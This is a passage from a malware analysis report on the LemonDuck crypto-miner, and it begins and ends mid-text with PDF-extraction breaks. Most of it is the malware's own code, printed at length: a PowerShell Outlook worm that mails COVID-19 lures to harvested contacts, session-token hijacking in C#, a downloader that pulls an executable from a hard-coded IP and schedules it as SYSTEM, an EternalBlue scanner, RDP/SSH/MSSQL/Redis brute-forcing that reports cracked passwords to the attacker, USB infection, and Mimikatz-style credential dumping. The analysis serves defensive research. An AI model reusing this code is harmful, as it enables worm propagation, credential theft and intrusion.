a\n_.rtf and a .js file as attachments, which will run the malware code on the victim’s machine if the phishing is successful._\nWe can also see the subjects and contents of the e-mails in the $global:mail_pools variable. The more interesting\nsubjects are those related to the COVID-19 pandemic. The script uses the Outlook.Application COM object to obtain the\ncontacts and send e-mails. Finally, the script reports to the attacker the number of contacts the user had as potential\nvictims.\n```\n# C# code to steal Administrator session ID\n\n```\n$msource=@”\n```\nusing System;\nusing System.Runtime.InteropServices;\n\n```\nnamespace Utils\n```\n{\n  public static class ProcessExtensions  \n     {\n\n```\nprivate const uint INVALID_SESSION_ID = 0xFFFFFFFF;\n\n[DllImport(“advapi32.dll”, EntryPoint = “CreateProcessAsUser”, SetLastError\n= true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.\nStdCall)]    private static extern bool CreateProcessAsUser(      IntPtr\nhToken,      String lpApplicationName,      String lpCommandLine,\nIntPtr lpProcessAttributes,      IntPtr lpThreadAttributes,      bool\nbInheritHandle,      uint dwCreationFlags,      IntPtr lpEnvironment,\nString lpCurrentDirectory,      ref STARTUPINFO lpStartupInfo,      out\n```\nPROCESS_INFORMATION lpProcessInformation);\n\n```\n[DllImport(“advapi32.dll”, EntryPoint = “DuplicateTokenEx”)]    private\nstatic extern bool DuplicateTokenEx(      IntPtr ExistingTokenHandle,\nuint dwDesiredAccess,      IntPtr lpThreadAttributes,      int TokenType,\nint ImpersonationLevel,      ref IntPtr DuplicateTokenHandle);\n\n[DllImport(“userenv.dll”, SetLastError = true)]    private static extern\nbool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);\n\n[DllImport(“userenv.dll”, SetLastError = true)]    [return:\nMarshalAs(UnmanagedType.Bool)]    private static extern bool\n```\nDestroyEnvironmentBlock(IntPtr lpEnvironment);\n\n```\n[DllImport(“kernel32.dll”, SetLastError = true)]    private static extern\n```\nbool CloseHandle(IntPtr hSnapshot);\n\n```\n[DllImport(“Wtsapi32.dll”, SetLastError=true)]    private static extern\nbool WTSQueryUserToken(uint SessionId, ref IntPtr phToken);\n\n[DllImport(“wtsapi32 dll” SetLastError = true)] private static\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\nextern int WTSEnumerateSessions(      IntPtr hServer,      int Reserved,\nint Version,      ref IntPtr ppSessionInfo,      ref int pCount);\n\n[StructLayout(LayoutKind.Sequential)]    private struct PROCESS_INFORMATION\n```\n         {\n      public IntPtr hProcess;\n      public IntPtr hThread;\n      public uint dwProcessId;\n      public uint dwThreadId;\n         }\n\n```\n[StructLayout(LayoutKind.Sequential)]    private struct STARTUPINFO\n```\n     {\n      public int cb;\n      public String lpReserved;\n      public String lpDesktop;\n      public String lpTitle;\n      public uint dwX;\n      public uint dwY;\n      public uint dwXSize;\n      public uint dwYSize;\n      public uint dwXCountChars;\n      public uint dwYCountChars;\n      public uint dwFillAttribute;\n      public uint dwFlags;\n      public short wShowWindow;\n      public short cbReserved2;\n      public IntPtr lpReserved2;\n      public IntPtr hStdInput;\n      public IntPtr hStdOutput;\n      public IntPtr hStdError;\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     }\n\n```\nprivate enum WTS_CONNECTSTATE_CLASS\n```\n     {\n\n```\nWTSActive,\n\nWTSConnected,\n\nWTSConnectQuery,\n\nWTSShadow,\n\nWTSDisconnected,\n\nWTSIdle,\n\nWTSListen,\n\nWTSReset,\n\nWTSDown,\n```\n      WTSInit\n     }\n\n```\n[StructLayout(LayoutKind.Sequential)]    private struct WTS_SESSION_INFO\n```\n     {\n\n```\npublic readonly UInt32 SessionID;\n\n[MarshalAs(UnmanagedType.LPStr)]      public readonly String\n```\npWinStationName;\n\n```\npublic readonly WTS_CONNECTSTATE_CLASS State;\n```\n     }\n\n```\nprivate static void StartProcessWithToken(ref IntPtr hUserToken,string cmd)\n```\n     {\n\n```\nSTARTUPINFO startInfo = new STARTUPINFO();\n```\n      PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();\n\n```\nIntPtr pEnv = IntPtr.Zero;\n\nif(CreateEnvironmentBlock(ref pEnv,hUserToken,false))\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n              {\n\n```\nConsole.WriteLine(“Create Environment Block Success”);\n```\n              }\n\n```\nstartInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));\n```\n      uint dwCreationFlags = 0x00000400 | 0x08000000;\n              //uint dwCreationFlags = 0x00000400 | 0x00000010;\n      startInfo.wShowWindow = 0;\n      startInfo.dwFlags = 1;\n      startInfo.lpDesktop = “winsta0\\\\default”;\n\n```\nif (CreateProcessAsUser(hUserToken, “c:\\\\windows\\\\system32\\\\cmd.exe”, “/c\n“+cmd, IntPtr.Zero, IntPtr.Zero, false, dwCreationFlags, pEnv, null, ref startInfo, out\n```\nprocInfo))      \n              {\n\n```\nConsole.WriteLine(“Start Process Success”);\n```\n      }\n              else \n              {\n\n```\nConsole.WriteLine(Marshal.GetLastWin32Error());\n```\n              }\n\n```\nCloseHandle(hUserToken);\n```\n      CloseHandle(procInfo.hThread);\n      CloseHandle(procInfo.hProcess);\n     }\n     public static void EnumSessionsAndExecCmd(string cmd)    \n     {\n\n```\nIntPtr hImpersonationToken = IntPtr.Zero;\n\nIntPtr pSessionInfo = IntPtr.Zero;\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n      int arrayElementSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));\n\n```\nIntPtr phUserToken = IntPtr.Zero;\n\nif (WTSEnumerateSessions(IntPtr.Zero, 0, 1, ref pSessionInfo, ref\n```\nsessionCount) != 0)      \n              {\n        Int64 current = pSessionInfo.ToInt64();\n        for (int i = 0; i < sessionCount; i++)        \n                  {\n          WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.\n\n```\nPtrToStructure((IntPtr)(current), typeof(WTS_SESSION_INFO));\n```\n          current += arrayElementSize;\n\n```\nConsole.WriteLine(“Get Session ID:”+si.SessionID);\n\nif (WTSQueryUserToken(si.SessionID, ref hImpersonationToken))\n```\n                       {\n\n```\nConsole.WriteLine(“Get Session Token Success”);\n\nif (DuplicateTokenEx(hImpersonationToken, 0, IntPtr.Zero, 2, 1,\nref phUserToken))\n```\n                           {\n\n```\nConsole.WriteLine(“Duplicate Token Success”);\n\nStartProcessWithToken(ref phUserToken,cmd);\n```\n              }\n          }\n        }\n      }\n    }\n  }\n}\n\n```\n“@Add-Type -TypeDefinition $msource\n\n$mail_code=@’\n\nif((get-childitem C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Outlook).count -gt 1)\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n{\n\n```\n$base_url=”CORE_URL”\n```\n     $att_doc=$env:tmp+”\\readme.doc”\n     $att_js=$env:tmp+”\\readme.js”\n\n```\n# Here is the payload generation from a big hardcoded Base64 string, edited out to\n```\nshorten script\n\n```\n$global:contacts=@()\n\n$global:sent_tos=@()\n\n$global:recv_froms=@()\n```\n# Mail subjects\n\n```\n$global:mail_pools=@(\n\n( “The Truth of COVID-19”, “Virus actually comes from United States of\nAmerica”),\n\n(“COVID-19 nCov Special info WHO”, “very important infomation for Covid19see attached document for your action and discretion.”),\n\n(“HALTH ADVISORY:CORONA VIRUS”, “the outbreak of CORONA VIRUS is cause\n```\nof concern especially where forign personal have recently arrived or will be arriving\n\n```\nat various intt in near future.see attached document for your action and discretion.”),\n\n(“WTF”,”what’s wrong with you?are you out of your mind!!!!!”),\n\n(“What the fcuk”,”are you out of your mind!!!!!what ‘s wrong with\nyou?”),\n\n(“good bye”,”good bye, keep in touch”),\n\n(“farewell letter”,”good bye, keep in touch”),\n\n(“broken file”,”can you help me to fix the file,i can’t read it”),\n\n(“This is your order?”,”file is brokened, i can’t open it”))\n```\n     $curr_date=Get-Date -Format “yyyy-MM-dd”\n     function get_contacts($ol_folders)\n     {\n         $folders=$ol_folders.folders\n         if($folders.count -ge 1)\n\n```\n\n-----\n\n```\n{\n}\n\n```\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\nforeach($folder in $folders)\n{\n     get_contacts($folder) \n}\n\n```\n```\n         foreach($item in $ol_folders.items)\n         {\n              if($global:contacts -notcontains $item.Email1Address)\n              {\n                  $global:contacts+=$item.Email1Address \n              }\n         }\n     }\n     function get_recv_froms($ol_folders)\n     {\n         $tcount=$ol_folders.items.count for($i=$tcount; ($i -gt 0) -and\n($i -gt ($tcount-500)); $i--)\n         {\n              $item = $ol_folders.items.item($i)\n              if($global:recv_froms -notcontains $item.SenderEmailAddress)\n              {\n                  $global:recv_froms+=$item.SenderEmailAddress \n              }\n         }\n     }\n     function get_sent_tos($ol_folders)\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     {\n         $folders=$ol_folders.folders\n         if($folders.count -ge 1)\n         {\n              foreach($folder in $folders)\n              {\n                  get_recv_froms($folder)\n              }\n         }\n\n```\n$regex = [regex]”(?i)\\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,4}\\b”\n```\n         foreach($item in $ol_folders.items)\n         {\n              foreach($m in $regex.matches($item.To))\n              {\n                  if($global:sent_tos -notcontains $m.value)\n                  {\n                       $global:sent_tos+=$m.value\n                  }\n              }\n\n```\n#$global:mail_pools+=,($item.subject,$item.body)\n```\n         }\n     }\n\n```\nfunction del_sendmail($name,$size,$flag)\n```\n     {\n\n```\n$ol_out=$ol.Session.GetDefaultFolder($flag)\n```\n         $tcount=$ol_out.items.count\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n```\n         {\n              $item = $ol_out.items.item($i)\n              foreach($attach in $item.Attachments)\n              {\n                  if(($attach.Filename -eq $name))\n                  {\n                       $item.Delete() \n                       write-host “Delete mail with attach:”+($attach.\nFilename)+”...” \n                       break\n                  }\n              }\n         }\n     }\n\n```\nfunction Add-Zip\n```\n     {\n\n```\nparam([string]$zipfilename)\n\nif(-not (test-path($zipfilename)))\n```\n         {\n\n```\nset-content $zipfilename (“PK” + [char]5 + [char]6 + (“$([char]0)”\n```\n* 18))    \n\n```\n(dir $zipfilename).IsReadOnly = $false\n```\n         }\n         $shellApplication = new-object -com shell.application  \n\n```\n$zipPackage = $shellApplication.NameSpace($zipfilename)\n\nforeach($file in $input)\n```\n         {\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n                   Start-sleep -milliseconds 500  \n         }\n     }\n\n```\n# Using Outlook.Application COM object to obtain information about current user’s\n```\ncontacts and e-mails\n     $ol=Ne`w-Obj`ect -Com outlook.application\n     get_contacts($ol.Session.GetDefaultFolder(10))\n     get_sent_tos($ol.Session.GetDefaultFolder(5))\n     get_recv_froms($ol.Session.GetDefaultFolder(6))\n     $muser=$ol.session.accounts.item(1).smtpaddress\n     $att_zip_name=”readme.zip”\n\n```\n$att_zip=$env:tmp+”\\$att_zip_name”dir $att_js|Add-Zip $att_zip\n\n$att_zip_filesize=[io.file]::readallbytes($att_zip).length\n\n# Exfiltrating obtained information to the attacker\n\n(New-object net.webclient).downloadstring(“DOWN_URL/report.\n```\njson?type=mail&u=$muser&c1=”+$contacts.count+”&c2=”+$sent_tos.count+”&c3=”+$recv_froms.\ncount)$ran_index=(get-random)%$mail_pools.length$mail_subject=$mail_pools[$ran_index]\n\n```\n[0]$mail_body=$mail_pools[$ran_index][1]del_sendmail $att_zip_name $att_zip_filesize\n```\n6foreach($sent_to in $sent_tos)\n     {\n         if($contacts -notcontains $sent_to)\n         {\n              $contacts+=$sent_to\n         }\n     }\n     foreach($recv_from in $recv_froms)\n     {\n         if($contacts -notcontains $recv_from)\n         {\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n```\n$contacts+=$recv_from\n\n```\n```\n         }\n     }\n# Send mail to each contact found\n     foreach($contact in $contacts)\n     {\n         $mail=$ol.CreateItem(0) \n         $mitem=$mail.Recipients.Add($contact)\n         $mail.Subject = $mail_subject \n         $mail.Body = $mail_body\n\n```\n$mail.Attachments.Add($att_doc,1,1,”readme.doc”)\n\n$mail.Attachments.Add($att_zip,1,1,”readme.zip”)\n```\n         “Sending mail...”\n         $mail.Send()\n         write-host “Send mail to $contact succ...”\n         sleep ((get-random)%5+5)\n\n```\ndel_sendmail $att_zip_name $att_zip_filesize 4\n\ndel_sendmail $att_zip_name $att_zip_filesize 5\n\ndel_sendmail $att_zip_name $att_zip_filesize 3\n```\n     }\n     remove-item $att_docremove-item $att_jsremove-item $att_zip”Done”\n}\n\n```\n‘@.replace(“CORE_URL”,$core_url).replace(“DOWN_URL”,$down_url)\n```\nif(([Security.Principal.WindowsPrincipal][Security.Principal.\nWindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]\n“Administrator”))\n{\n     $sesscmd=’powershell -c\n     $pipe=new-object System.IO.Pipes.NamedPipeServerStream(‘’\\\\.\\pipe\\HHyeuqi7’’);\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     $sr=new-object System.IO.StreamReader($pipe);\n     $cmd=$sr.ReadToEnd();\n     $sr.Dispose();\n     $pipe.Dispose();\n     I`Ex($cmd);\n     (new-object System.IO.Pipes.NamedPipeServerStream(‘’\\\\.\\pipe\\HHyeuqi7’’)).\nWaitForConnection()’\n\n```\n[Utils.ProcessExtensions]::EnumSessionsAndExecCmd($sesscmd.Trim())\n```\n     $pipe=new-object System.IO.Pipes.NamedPipeClientStream(“\\\\.\\pipe\\HHyeuqi7”);\n     $pipe.Connect();\n     $sw=new-object System.IO.StreamWriter($pipe);\n\n```\n$sw.WriteLine($mail_code);\n```\n     $sw.Dispose();\n     $pipe.Dispose() (new-object System.IO.Pipes.NamedPipeClientStream(“\\\\.\\pipe\\\nHHyeuqi7”)).Connect()\n     “Done and exit...”\n}\nelse\n{\n     I`Ex $mail_code\n}\n\n```\nnew-item $env:tmp\\godmali4.txt -type file -force -JOIn\n\n### Ode.bin\n\nThe third SIEX call receives a Powershell script that downloads and executes a new payload. After downloading the\npayload to \\AppData\\Local\\Temp\\, the script checks if the MD5 of the file matches a hard-coded value and schedules\na task to execute it.\n```\n$path4 = “$env:temp\\kk4kk.log”\n$pname = -join ([char[]](97..122) | Get-Random -Count (Get-Random -Minimum 4 -Maximum\n8))\n$pnamepath = “$env:tmp\\$pname.exe”\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n# Download file\n\n(new-object net.webclient).downloadfile(“http://167.71.87.85/20.\ndat?$params”,$pnamepath)\n```\n     if((test-path $pnamepath) -and ((gmd5 ([IO.File]::ReadAllBytes($pnamepath))) -eq\n‘ef3a4697773f84850fe1a086db8edfe0’))\n     {\n\n```\n# Schedule the file to run if the MD5 matches\n```\n         if($permit)\n         {\n\n```\n&cmd.exe /c schtasks /create /ru SYSTEM /sc MINUTE /mo 50 /tn “\\\n```\nMicrosoft\\Windows\\$pname” /tr “$pnamepath” /F\n         }\n         else\n         {\n              ‘Set ws = CreateObject(“Wscript.Shell”)’ | Out-File $env:temp\\\\\ntt.vbs\n\n```\n‘ws.run “cmd /c ‘ + $pnamepath + ‘”,vbhide’ | Out-File -Append\n```\n$env:temp\\\\tt.vbs\n\n```\n&cmd.exe /c schtasks /create /sc MINUTE /mo 50 /tn “$pname” /tr\n```\n“$env:temp\\\\tt.vbs” /F\n         }\n\n```\nNew-Item $path4 -type file\n```\n     }\n}\n\n```\nThe downloaded payload is a compiled python executable file that contains PowerSploit. It is detected on VirusTotal by\nmost of the aggregated engines.\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n## Payloads Downloaded to Disk\n\n### if.bin aka. InFect many other systems\n\n_If.bin is a hefty 270 KB file that contains a zipped Powershell script. At the moment, only two engines detect it on_\nVirusTotal. When deobfuscated, this script is revealed as a big collection of exploitation/pen-testing tools or security\naudit tools, mostly taken from publicly available sources and used for lateral movement. Due to the file’s size, we\ncannot present it entirely in this article, but we will mention its capabilities, providing code snippets for the more\ninteresting parts.\n\n- **EternalBlue exploitation - using PingCastle port scanner [4] to detect machines that respond on port 445 and**\nthen launching the SMB exploitation\n```\nnamespace PingCastle.Scanners\n{\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     public class m17sc\n     {\n         static public bool Scan(string computer)\n         {\n              TcpClient client = new TcpClient();\n\n```\nclient.Connect(computer, 445);\n```\n              try\n              {\n                  NetworkStream stream = client.GetStream();\n                  byte[] negotiatemessage = GetNegotiateMessage();\n\n```\nstream.Write(negotiatemessage, 0, negotiatemessage.\nLength);\n```\n                  stream.Flush();\n                  byte[] response = ReadSmbResponse(stream);\n                  if (!(response[8] == 0x72 && response[9] == 00))\n                  {\n                       throw new InvalidOperationException(“invalid\nnegotiate response”);\n                  }\n                  byte[] sessionSetup = GetR(response);\n\n```\nstream.Write(sessionSetup, 0, sessionSetup.Length);\n```\n                  stream.Flush();\n                  response = ReadSmbResponse(stream);\n                  if (!(response[8] == 0x73 && response[9] == 00))\n                  {\n                       throw new InvalidOperationException(“invalid\nsessionSetup response”);\n                  }\n\n```\nbyte[] treeconnect = GetTreeConnectAndXRequest(response,\n```\ncomputer);\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n                  stream.Flush();\n                  response = ReadSmbResponse(stream);\n                  if (!(response[8] == 0x75 && response[9] == 00))\n                  {\n                       throw new InvalidOperationException(“invalid\nTreeConnect response”);\n                  }\n                  byte[] peeknamedpipe = GetPeekNamedPipe(response);\n\n```\nstream.Write(peeknamedpipe, 0, peeknamedpipe.Length);\n```\n                  stream.Flush();\n                  response = ReadSmbResponse(stream);\n                  if (response[8] == 0x25 && response[9] == 0x05 &&\nresponse[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )\n                  {\n                       return true;\n                  }\n              }\n              catch (Exception)\n              {\n                  throw;\n              }\n              return false;\n         }\n\n```\n- **RDB brute-forcing module**\n```\nnamespace RDP\n{\n\n```\npublic class BRUTE\n```\n  {\n\n```\nprivate int flag1=-1;\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n         private Process process;\n         public void exit(){\n              if(!process.HasExited){\n                  process.Kill();\n              };\n              process.Close();\n         }\n\n```\npublic int check(string exePath, string ip, string user, string pass, bool\n```\nchecklogin)\n    {\n              try{\n                  check_login = checklogin;\n                  process = new System.Diagnostics.Process();\n                  process.StartInfo.FileName = exePath;\n                  if(checklogin){\n                       process.StartInfo.Arguments = “/u:”+user+”\n/p:”+pass+” /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:”+ip;\n                  } else {\n                       process.StartInfo.Arguments = “/u:”+user+”\n/p:”+pass+” /cert-ignore +auth-only /sec:nla /log-level:trace /v:”+ip;\n                  }\n\n```\nprocess.StartInfo.UseShellExecute = false;\n```\n                  process.StartInfo.CreateNoWindow = true;\n                  process.StartInfo.RedirectStandardOutput = true;\n                  process.Start();\n\n```\nprocess.BeginOutputReadLine();\n```\n                  process.OutputDataReceived += new\nDataReceivedEventHandler(processOutputDataReceived);\n                  System.Threading.Timer timer = new System.Threading.\n\n```\nTimer(autoQuite null 10000 5000);\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n                  while(true){\n                       if(process.HasExited){return 0;}\n                       Thread.Sleep(1000);\n\n```\nif(flag1!=-1) {\n```\n                           if(!checklogin){exit();}\n\n```\nreturn flag1;\n```\n                       }\n                  }\n              }\n              catch (Exception ex)\n      {\n\n```\nConsole.WriteLine(ex.Message);\n```\n                  return 0;\n      }\n    }\n\n```\n- **USBLNK - able to infect network drives and removable drives that have FAT32 and NTFS file systems. Creates**\n.lnk files on these drives to execute code\n```\nstatic bool IsSupported(DriveInfo drive) {\nreturn drive.IsReady && drive.AvailableFreeSpace > 1024\n      && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.\nNetwork)\n      && (drive.DriveFormat == “FAT32” || drive.DriveFormat == “NTFS”);\n}\nstatic bool CheckBlacklist(string name) { return name==home || name==”System Volume\n\n```\nInformation” || name==”$RECYCLE.BIN”;}\n```\nstatic bool Infect(string drive)\n{\n  if (blacklist.Contains(drive)) {return true;}\n\n```\nCreateLnk(drive, “blue3.bin”, gb3);\n\nCreateLnk(drive, “blue6.bin”, gb6);\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n\nCreateJs(drive, “readme.js”, jsdata);\n```\n  try\n  {\n    File.Create(drive + home + inf_data);\n    return true;\n  }\n  catch (Exception ex)\n  {\n\n```\nConsole.WriteLine(ex.Message);\n```\n  }\n  return false;\n}\n\n```\n- **PowerDump [5] and Mimikatz to dump NTLM passwords, used in pass the hash attacks**\n```\n#######################################powerdump written by David\nKennedy#########################################\n$antpassword = [Text.Encoding]::ASCII.GetBytes(“NTPASSWORD`0”);\n\n```\n$almpassword = [Text.Encoding]::ASCII.GetBytes(“LMPASSWORD`0”);\n\n$empty_lm = [byte[]]@\n(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);\n\n$empty_nt = [byte[]]@\n(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);\n\n$odd_parity = @(\n\n1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,\n\n16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,\n\n32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,\n\n49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,\n\n64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,\n\n81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,\n\n128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,\n\n145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,\n\n161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,\n\n176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,\n\n193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,\n\n208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,\n\n224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,\n\n241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254\n```\n);\n\n```\nSpecific code from MimiKatz:\n\nFunction LGDJSR\n```\n{\n  $DJH32H = New-Object System.Object\n  $Domain = [AppDomain]::CurrentDomain\n\n```\n$DynamicAssembly = New-Object System.Reflection.AssemblyName(‘DynamicAssembly’)\n\n$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.\nReflection.Emit.AssemblyBuilderAccess]::Run)\n\n$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(‘DynamicModule’, $false)\n```\n  $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].\nGetConstructors()[0]\n\n```\n$LHFSser = $ModuleBuilder.DefineEnum(‘MachineType’, ‘Public’, [UInt16])\n\n$LHFSser.DefineLiteral(‘Native’, [UInt16] 0) | Out-Null\n\n$LHFSser.DefineLiteral(‘I386’, [UInt16] 0x014c) | Out-Null\n\n$LHFSser.DefineLiteral(‘Itanium’, [UInt16] 0x0200) | Out-Null\n\n$LHFSser.DefineLiteral(‘x64’, [UInt16] 0x8664) | Out-Null\n\n$MachineType = $LHFSser.CreateType()\n```\n  $DJH32H | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType\n\n```\n$LHFSser = $ModuleBuilder.DefineEnum(‘MagicType’, ‘Public’, [UInt16])\n\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n$LHFSser.DefineLiteral(‘IMAGE_NT_OPTIONAL_HDR64_MAGIC’, [UInt16] 0x20b) | Out-Null\n\n$MagicType = $LHFSser.CreateType()\n```\n  $DJH32H | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType\n\n```\n$LHFSser = $ModuleBuilder.DefineEnum(‘SubSystemType’, ‘Public’, [UInt16])\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_UNKNOWN’, [UInt16] 0) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_NATIVE’, [UInt16] 1) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_WINDOWS_GUI’, [UInt16] 2) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_WINDOWS_CUI’, [UInt16] 3) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_POSIX_CUI’, [UInt16] 7) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_WINDOWS_CE_GUI’, [UInt16] 9) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_EFI_APPLICATION’, [UInt16] 10) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER’, [UInt16] 11) |\n```\nOut-Null\n\n```\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER’, [UInt16] 12) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_EFI_ROM’, [UInt16] 13) | Out-Null\n\n$LHFSser.DefineLiteral(‘IMAGE_SUBSYSTEM_XBOX’, [UInt16] 14) | Out-Null\n\n$SubSystemType = $LHFSser.CreateType()\n```\n  $DJH32H | Add-Member -MemberType NoteProperty -Name SubSystemType -Value\n$SubSystemType\n\n```\n- **MS-SQL brute-forcing - scans IPs for ports 1433 and attempts to brute-force accounts, similar to Kingminer**\n```\nwrite-host “start mssql port open scanning...”\n$ms_portopen = localscan -port 1433 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $ms_portopen[1]\nforeach($currip in $ms_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n         write-host “start mssql burping...$currip”\n         for($n=0; $n -lt $allpass.count; $n++){\n\n```\n$flag=$false\n```\n              write-host(“Try pass: “+$allpass[$n])\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n$mscmd_code -cmd1 $mscmd_code)[-2..-1]\n\n```\nif($flag) {\n```\n                  try{(New-Object Net.WebClient).DownloadString($down_url+’/report.json?v=’+$VVERSION+’&type=ms&ip=’+$currip+’&pass=’+$allpass[$n]+’&t=’+$t+’&b=’+$banner)}catch{}\n                  break\n              }\n         }\n     }\n}\n\n```\n- **SSH brute-forcing**\n```\nwrite-host “start ssh port open scanning...”\n$ssh_portopen = localscan -port 22 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $ssh_portopen[1]\nforeach($currip in $ssh_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n         write-host “start ssh burping...$currip”\n         foreach($password in $allpass){\n              write-host “Try pass:$password”\n\n```\n$flag1 = -1\n\n$flag1 = sshbrute $currip “root” $password $ssh_code\n\nif($flag1 -eq 1){\n\nwrite-host “SUCC!!”\n```\n                  try{(New-Object Net.WebClient).DownloadString($down_\nurl+’/report.json?v=’+$VVERSION+’&type=ssh&ip=’+$currip+’&pass=’+$password+’&t=’+$t)}\ncatch{}\n                  break\n              }\n         }\n     }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n\n- **Redis (Remote Dictionary Server) command execution - scans for ports 6379 and 16379 and then attempt to**\nexecute remote commands\n```\nwrite-host “start redis port1 open scanning...”\n$redis_portopen = localscan -port 6379 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $redis_portopen[1]\nforeach($currip in $redis_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n         write-host “start redis command check...$currip”\n\n```\n$flag1 = redisexec $currip $redis_code\n\nif($flag1 -eq $true){\n\nwrite-host “SUCC!!”\n```\n              try{(New-Object Net.WebClient).DownloadString($down_url+’/report.\njson?v=’+$VVERSION+’&type=rds&ip=’+$currip+’&t=’+$t)}catch{}\n              break\n         }\n     }\n}\nwrite-host “start redis port2 open scanning...”\n$redis_portopen = localscan -port 16379 -addresses $ipaddresses[$i..($i+$tcount-1)]\n$old_portopen = localscan -port 65529 -addresses $redis_portopen[1]\nforeach($currip in $redis_portopen[1]) {\n     if (($old_portopen[1] -notcontains $currip) -and ($currip.length -gt 6)){\n         write-host “start redis command check...$currip”\n\n```\n$flag1 = redisexec $currip $redis_code\n\nif($flag1 -eq $true){\n\nwrite-host “SUCC!!”\n```\n              try{(New-Object Net.WebClient).DownloadString($down_url+’/report.\njson?v=’+$VVERSION+’&type=rds&ip=’+$currip+’&t=’+$t)}catch{}\n              break\n         }\n\n```\n\n-----\n\nDissecting LemonDuck Crypto-Miner, a KingMiner Successor\n```\n     }\n}\n\n```\n- **Yarn command execution - scans for port 8088 and attempts to execute remote commands**\n```\nwrite-host “start yarn port open scanning...”\n$yarn_portopen = 